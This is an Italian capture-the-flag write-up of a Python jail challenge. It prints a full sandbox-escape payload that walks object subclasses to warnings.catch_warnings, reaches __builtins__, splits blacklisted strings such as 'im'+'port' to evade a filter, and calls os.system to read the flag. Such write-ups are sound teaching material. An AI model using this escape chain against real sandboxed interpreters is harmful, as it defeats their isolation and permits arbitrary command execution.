Il comando da eseguire è:


```().__class__.__bases__[0].__subclasses__()[227].__init__.__globals__['__builtins__']['__im'+'port__']('o'+'s').__dict__['sy'+'stem']('cat fl'+'ag')```

Il punto di partenza è:
```().__class__.__bases__[0].subclasses__()```
Questo comando ci permette infatti di vedere tutte le classi interne a noi accessibili, tra le quali potrebbe esserci qualcosa di utile.

Se con un for stampiamo le classi, notiamo alla riga 227 ```warnings.catch_warnings```, che sicuramente può servirci per fare sandbox escape


Da esso possiamo estrarre con ```__init__.__globals__['__builtins__']``` import

Ovviamente la stringa è blacklistata, ma per bypassare la blacklist ci basta dividerla in ```im + port```, e facciamo lo stesso anche per os 

Adesso con .dict possiamo accedere a os.system, che ci permette di usare il comando cat flag, ottenendo finalmente la flag

**flag{LOWER_upper_3scap3_Fr0m_j@il}**